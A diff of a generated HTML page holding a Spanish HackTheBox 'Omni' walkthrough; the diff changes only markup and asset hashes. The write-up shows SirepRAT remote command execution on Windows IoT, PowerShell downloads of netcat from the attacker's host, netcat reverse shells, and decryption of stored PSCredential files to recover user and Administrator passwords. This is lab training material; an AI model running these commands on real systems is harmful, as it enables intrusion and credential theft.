@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Omni es una maquina de HackTheBox diferente ya que encontramos un SO Windows IOT, descubrimos que existe una vulnerabilidad la cual aprovechamso para ejecutar una shell inversa. Enumerando diferentes archivos encontramos credenciales almacenadas que nos permitieron ingresar al Portal y obtener acceso privilegiado.">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1665,7 +1665,7 @@
     Matrix
   </span>
 </a></td>
-<td align="center"><div class="box"><pre tabindex="0"><code class="language-chart" data-lang="chart">{
+<td align="center"><div class="box"><pre><code class="language-chart" data-lang="chart">{
    &quot;type&quot;:&quot;radar&quot;,
    &quot;data&quot;:{
       &quot;labels&quot;:[&quot;Enumeration&quot;,&quot;Real-Life&quot;,&quot;CVE&quot;,&quot;Custom Explotation&quot;,&quot;CTF-Like&quot;],
@@ -1697,7 +1697,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1739,7 +1739,7 @@
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat Sep 12 16:50:46 2020 as: nmap -Pn -p- --min-rate 1000 -o allports omni.htb</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat Sep 12 16:50:46 2020 as: nmap -Pn -p- --min-rate 1000 -o allports omni.htb</span>
 Nmap scan report <span class="k">for</span> omni.htb <span class="o">(</span>10.10.10.204<span class="o">)</span>
 Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
 Not shown: <span class="m">65529</span> filtered ports
@@ -1784,21 +1784,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><h1 id="http-8080">HTTP 8080</h1>
 <p>Encontramos una pagina que pregunta por credenciales y muestra el mensaje <code>Windows Device Portal</code>.<br />
 <img src="/images/posts/htb/omni/Screenshot_20200912_151916.png" alt="" /></p>
-<h2 id="sireprat">SIREPRAT</h2>
+<h2 id="sireprat-">SIREPRAT</h2>
 <p>Investigamos acerca de este &ldquo;Portal&rdquo; y encontramos que es un portal para dispositivos IoT. Encontramos una herramienta con la cual es posible realizar ejecucion de comandos en la maquina: <a href="https://github.com/SafeBreach-Labs/SirepRAT"><strong>SirepRAT</strong></a>.</p>
 <p>En caso de error instalar:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pip install enum34
+<pre class="chroma"><code class="language-bash" data-lang="bash">pip install enum34
 </code></pre></td></tr></table>
 </div>
 </div><p>Ejecutamos esta herramienta para obtener el archivo <code>hosts</code> de windows, el cual logramos obtener.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1827,23 +1827,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path <span class="s2">&#34;C:\Windows\System32\drivers\etc\hosts&#34;</span> --v 
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path <span class="s2">&#34;C:\Windows\System32\drivers\etc\hosts&#34;</span> --v 
 ---------
 <span class="c1"># Copyright (c) 1993-2009 Microsoft Corp.</span>
-<span class="c1">#</span>
+#
 <span class="c1"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span>
-<span class="c1">#</span>
+#
 <span class="c1"># This file contains the mappings of IP addresses to host names. Each</span>
 <span class="c1"># entry should be kept on an individual line. The IP address should</span>
 <span class="c1"># be placed in the first column followed by the corresponding host name.</span>
 <span class="c1"># The IP address and the host name should be separated by at least one</span>
 <span class="c1"># space.</span>
-<span class="c1">#</span>
+#
 <span class="c1"># Additionally, comments (such as these) may be inserted on individual</span>
 <span class="c1"># lines or following the machine name denoted by a &#39;#&#39; symbol.</span>
-<span class="c1">#</span>
+#
 <span class="c1"># For example:</span>
-<span class="c1">#</span>
+#
 <span class="c1">#      102.54.94.97     rhino.acme.com          # source server</span>
 <span class="c1">#       38.25.63.10     x.acme.com              # x client host</span>
 
@@ -1859,13 +1859,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><p>Ahora que tenemos acceso vamos a ejecutar una shell inversa con netcat, primero descargamos netcat aunque la version que tiene Kali no funcionó en la maquina por lo que descargamos la <a href="https://eternallybored.org/misc/netcat/"><strong>version de 64 bits</strong></a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span class="s1">&#39; /c \\10.10.14.44\TMP\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.44 1338&#39;</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span class="s1">&#39; /c \\10.10.14.44\TMP\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.44 1338&#39;</span>
 &lt;HResultResult <span class="p">|</span> type: 1, payload length: 4, HResult: 0x0&gt;
 &lt;OutputStreamResult <span class="p">|</span> type: 11, payload length: 295, payload peek: <span class="s1">&#39;You can&#39;</span>t connect to the file share because it<span class="s1">&#39;s n&#39;</span>&gt;
 &lt;ErrorStreamResult <span class="p">|</span> type: 12, payload length: 4, payload peek: <span class="s1">&#39;&#39;</span>&gt;
@@ -1874,7 +1874,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><p>Descargamos, ponemos a la escucha netcat, ejecutamos nuestra shell inversa y logramos obtener una shell con el usuario <code>DefaultAccount</code> pero si no le pasamos el parametro <code>--as_logged_on_user</code> obtenemos una shell con usuario <code>omni$</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1882,7 +1882,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Descarga de netcat</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Descarga de netcat</span>
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span class="s1">&#39; /c powershell -c &#34;&amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\Data\Users\DefaultAccount\nc64.exe }&#34;&#39;</span>
 
 <span class="c1">#Ejecutar shell inversa</span>
@@ -1894,7 +1894,7 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_log
 <p>Tenemos acceso a los directorios de los usuarios y encontramos la flag <code>user.txt</code> y <code>root.txt</code> con el usuario <code>omni$</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1975,7 +1975,7 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_log
 </span><span class="lnt">79
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\D</span>ata<span class="se">\U</span>sers&gt;dir app
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\D</span>ata<span class="se">\U</span>sers&gt;dir app
 dir app
  Volume in drive C is MainOS
  Volume Serial Number is 3C37-C677
@@ -2059,7 +2059,7 @@ C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a
 </div><p>Intentamos obtener las flags pero no fue posible:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2073,7 +2073,7 @@ C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 Import-CliXml : Error occurred during a cryptographic operation.
 At line:1 char:15
@@ -2090,7 +2090,7 @@ PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se"
 </div><p>Encontramos un archivo el cual contiene unas credenciales del usuario <code>app</code> y <code>Administrator</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2126,7 +2126,7 @@ PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se"
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowershell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement&gt; ls -force
+<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowershell<span class="se">\M</span>odules<span class="se">\P</span>ackageManagement&gt; ls -force
 ls -force
 
 
@@ -2170,16 +2170,16 @@ PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPower
 <p>Ejecutamos una shell inversa para tener acceso con el usuario <code>app</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">powershell -c <span class="s2">&#34;&amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\Data\Users\app\nc64.exe}&#34;</span> <span class="p">&amp;</span> powershell -c C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\n</span>c64.exe -e cmd.exe 10.10.14.44 <span class="m">1335</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">powershell -c <span class="s2">&#34;&amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\Data\Users\app\nc64.exe}&#34;</span> <span class="p">&amp;</span> powershell -c C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\n</span>c64.exe -e cmd.exe 10.10.14.44 <span class="m">1335</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>La primera vez al ejecutar la lectura de la flag nos dio error por lo que tuvimos que verificar el disco duro el cual no era <code>C</code> si no <code>U</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2194,7 +2194,7 @@ PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPower
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path C:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path C:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path C:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 Import-CliXml : Could not find a part of the path 
 <span class="s1">&#39;C:\Users\app\user.txt&#39;</span>.
@@ -2212,14 +2212,14 @@ PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se"
 </div><p>Ejecutamos y leemos nuestra flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>pp<span class="se">\u</span>ser.txt
 PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>pp&gt; <span class="nv">$credential</span>.GetNetworkCredential<span class="o">()</span>.Password
 <span class="nv">$credential</span>.GetNetworkCredential<span class="o">()</span>.Password
@@ -2230,13 +2230,13 @@ PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se"
 <p>Ahora ejecutamos una shell inversa con el usuario Administrador y de la misma forma logramos obtener la flag <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>dministrator<span class="se">\r</span>oot.txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator&gt; <span class="nv">$credential</span> <span class="o">=</span> Import-CliXml -Path U:<span class="se">\U</span>sers<span class="se">\a</span>dministrator<span class="se">\r</span>oot.txt
 PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator&gt; <span class="nv">$credential</span>.GetNetworkCredential<span class="o">()</span>.Password
 5dbd<span class="o">[</span>... REDACTED ...<span class="o">]</span>6e9bf11d
 PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se">\a</span>dministrator&gt;
@@ -2502,7 +2502,7 @@ PS C:<span class="se">\D</span>ata<span class="se">\U</span>sers<span class="se"
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3621,7 +3621,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#nmap">NMAP</a></li>
     <li><a href="#http-8080">HTTP 8080</a>
       <ul>
-        <li><a href="#sireprat">SIREPRAT</a></li>
+        <li><a href="#sireprat-">SIREPRAT</a></li>
       </ul>
     </li>
     <li><a href="#app---user">APP - USER</a></li>
